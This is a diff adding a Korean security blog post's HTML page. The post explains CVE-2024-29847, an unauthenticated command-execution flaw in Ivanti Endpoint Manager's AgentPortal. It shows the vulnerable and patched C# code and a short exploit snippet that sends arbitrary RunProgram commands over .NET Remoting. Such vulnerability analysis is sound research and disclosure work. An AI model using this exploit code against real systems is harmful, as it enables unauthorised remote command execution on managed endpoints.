+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2024-09-14 19:00" pubdate>
+      2024년 9월 14일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      462 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      9
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[하루한줄] CVE-2024-29847 : Ivanti Endpoint Manager (EPM)의 데이터 검증 미흡으로 인한 Unauthenticated Command Execution 취약점</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+              <!-- hackyboiz_horizen_index -->
+              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29847-deep-dive-ivanti-endpoint-manager-agentportal-deserialization-of-untrusted-data-remote-code-execution-vulnerability/">CVE-2024-29847 Deep Dive: Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability</a></li>
+</ul>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
+<li>Ivanti EPM before 2022 SU6</li>
+<li>Ivanti EPM the 2024 September update</li>
+</ul>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AgentPortal.exe&#xC5D0;&#xB294; .Net Remoting&#xC744; &#xAD6C;&#xD604;&#xD558;&#xAE30; &#xC704;&#xD55C; IAngentProtal &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IAgentPortal&#xC5D0; RunProgram &#xC635;&#xC158;&#xC744; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ProcessRunProgramAction</span>(<span class="hljs-params">TaskData td, TaskData tdRef, <span class="hljs-keyword">string</span>[] data</span>)</span>
+<span class="hljs-function"></span>{
+	<span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;
+	<span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;
+	<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">string</span> command <span class="hljs-keyword">in</span> td._commands)
+	{
+		<span class="hljs-keyword">try</span> {
+			Process process = <span class="hljs-keyword">new</span> Process();
+			process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;
+			process.StartInfo.RedirextStadardOutput = <span class="hljs-literal">true</span>;
+			process.StartInfo.FileName = td._target;
+			process.StartInfo.Arguments = command; <span class="hljs-comment">// [1]</span>
+			process.Start(); <span class="hljs-comment">// [2]</span></code></pre>
+<p>&#xC704; &#xCF54;&#xB4DC; [1]&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xAC00;&#xC838;&#xC640; [2]&#xC5D0;&#xC11C; &#xADF8;&#xB300;&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; command&#xC5D0; &#xB300;&#xD574; &#xC544;&#xBB34;&#xB7F0;&#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p>
+<pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ProcessRunProgramAction</span>(<span class="hljs-params">TaskData td, TaskData tdRef, <span class="hljs-keyword">string</span>[] data</span>)</span>
+<span class="hljs-function"></span>{
+	<span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;
+	<span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;
+	<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">string</span> command <span class="hljs-keyword">in</span> td._commands)
+	{
+		<span class="hljs-keyword">try</span> {
+			Process process = <span class="hljs-keyword">new</span> Process();
+			process.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;
+			process.StartInfo.RedirextStadardOutput = <span class="hljs-literal">true</span>;
+			<span class="hljs-keyword">if</span> (td._target != <span class="hljs-string">&quot;ping.exe&quot;</span> &amp;&amp; td._target != <span class="hljs-string">&quot;tracert.exe&quot;</span>)
+				<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+			process.StartInfo.FileName = td._target;
+			process.StartInfo.Arguments = command;
+			process.Start();</code></pre>
+<p>&#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC774; ping&#xC774;&#xB098; tracert&#xAC00; &#xC544;&#xB2C8;&#xBA74; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs csharp"><span class="hljs-keyword">var</span> ip = args[<span class="hljs-number">0</span>];
+<span class="hljs-keyword">var</span> port = args[<span class="hljs-number">1</span>];
+<span class="hljs-keyword">var</span> command = args[<span class="hljs-number">2</span>];
+<span class="hljs-keyword">string</span> arguments = <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">if</span> (args.Length &gt; <span class="hljs-number">3</span>)
+{
+   arguments = <span class="hljs-keyword">string</span>.Join(<span class="hljs-string">&quot; &quot;</span>, args, <span class="hljs-number">3</span>, args.Length - <span class="hljs-number">3</span>);
+}
+
+<span class="hljs-keyword">string</span> url = String.Format(<span class="hljs-string">&quot;tcp://{0}:{1}/LANDeskAgentPortal/LDSM&quot;</span>, ip, port);
+IAgentPortal agentPortal = (IAgentPortal)Activator.GetObject(<span class="hljs-keyword">typeof</span>(IAgentPortal), url);
+
+<span class="hljs-keyword">try</span>
+{
+    Console.WriteLine(<span class="hljs-string">&quot;Sending request.&quot;</span>);
+    <span class="hljs-keyword">bool</span> request_result = agentPortal.Request(<span class="hljs-string">&quot;localhost&quot;</span>, IAgentPortalBase.ActionEnum.RunProgram, command,  arguments);</code></pre>
+<p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xAC04;&#xB2E8;&#xD55C; &#xB9CC;&#xD07C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xB3C4; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD558;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB123;&#xC5B4; Agetnportal&#xC5D0; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC27D;&#xACE0; &#xC778;&#xC99D;&#xC744; &#xAC70;&#xCE58;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; CVSS3.1 9.8&#xC810;&#xC744; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/horizon3ai/CVE-2024-29847">horizon3ai/CVE-2024-29847</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.zerodayinitiative.com/advisories/ZDI-24-1223/">Ivanti Endpoint Manager AgentPortal Deserialization of Untrusted Data Remote Code Execution Vulnerability</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/1day1line/">1day1line</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/RCE/">RCE</a>
+                  
+                  <a class="hover-with-bg" href="/tags/j0ker/">j0ker</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Ivanti/">Ivanti</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Endpoint-Manager/">Endpoint Manager</a>
+                  
+                  <a class="hover-with-bg" href="/tags/EPM/">EPM</a>
+                  
+                  <a class="hover-with-bg" href="/tags/AgentPortal/">AgentPortal</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Deserialization/">Deserialization</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Command-Execution/">Command Execution</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Remote-Code-Execution/">Remote Code Execution</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_j0ker.jpg" srcset="/img/loading.gif" alt="j0ker">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">j0ker</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/j0ker">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+
+              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[Research] Hyper-V 1-day Class: CVE-2024-38127</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2024/09/11/pwndorei/2024-09-11/">
+                    <span class="hidden-mobile">[하루한줄] CVE-2024-45751: tgt의 CHAP authentication 우회 취약점</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2024/09/14/j0ker/2024-09-14/';
+        this.page.identifier = '/2024/09/14/j0ker/2024-09-14/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[하루한줄] CVE-2024-29847 : Ivanti Endpoint Manager (EPM)의 데이터 검증 미흡으로 인한 Unauthenticated Command Execution 취약점&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
